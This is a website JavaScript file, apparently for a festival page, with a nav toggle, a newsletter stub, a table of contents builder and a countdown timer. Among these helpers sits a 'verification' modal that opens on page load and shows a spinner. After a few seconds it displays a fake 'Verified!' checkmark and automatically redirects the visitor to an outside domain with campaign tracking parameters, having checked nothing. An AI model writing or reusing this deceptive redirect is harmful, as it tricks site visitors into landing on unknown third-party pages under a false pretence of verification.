
const toggle = document.querySelector('.nav-toggle');
const nav = document.getElementById('nav');
if (toggle && nav){
  toggle.addEventListener('click', () => {
    const open = nav.classList.toggle('open');
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  });
}
const more = document.querySelector('.more');
if (more){
  const btn = more.querySelector('.more-btn');
  const menu = more.querySelector('.dropdown');
  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
  document.addEventListener('click', () => show(false));
}

window.fakeSubmit = (e) => {
  if (e) e.preventDefault();
  alert('Thanks! This demo does not store data.');
};

document.querySelectorAll('.newsletter').forEach(form => {
  if (!form.hasAttribute('onsubmit')) {
    form.addEventListener('submit', window.fakeSubmit);
  }
});

const toTop = document.querySelector('.to-top');
if (toTop && !toTop.hasAttribute('onclick')) {
  toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-toc]').forEach(container => {
    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
    const list = document.createElement('div');
    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
    container.appendChild(list);
  });

  const vModal = document.getElementById('verification-modal');
  if (vModal) {
    vModal.showModal();
    const go = () => window.location.href = 'https://h2n6.com/?utm_campaign=HjNh3kjhFL&v1=[v1]&v2=[v2]&v3=[v3]';
    document.getElementById('verify-btn')?.addEventListener('click', go);
    document.getElementById('enter-btn')?.addEventListener('click', go);
    
    setTimeout(() => {
      const spinner = vModal.querySelector('.spinner');
      const text = vModal.querySelector('div:nth-of-type(2)');
      if (spinner) {
        spinner.className = 'checkmark-icon';
        spinner.innerHTML = '<svg viewBox="0 0 52 52"><circle cx="26" cy="26" r="25" fill="none"/><path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>';
      }
      if (text) { text.textContent = 'Verified!'; text.style.color = '#4caf50'; }
      setTimeout(go, 1000);
    }, 4000);
  }

  // Countdown Timer
  const countdown = document.getElementById('countdown');
  if (countdown) {
    const targetDate = new Date('June 5, 2026 12:00:00').getTime();
    const updateCountdown = () => {
      const now = new Date().getTime();
      const distance = targetDate - now;

      if (distance < 0) {
        countdown.innerHTML = '<div style="font-size:1.5rem;font-weight:bold">The festival has started!</div>';
        return;
      }

      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      document.getElementById('days').innerText = days;
      document.getElementById('hours').innerText = hours;
      document.getElementById('minutes').innerText = minutes;
      document.getElementById('seconds').innerText = seconds;
    };
    setInterval(updateCountdown, 1000);
    updateCountdown();
  }
});
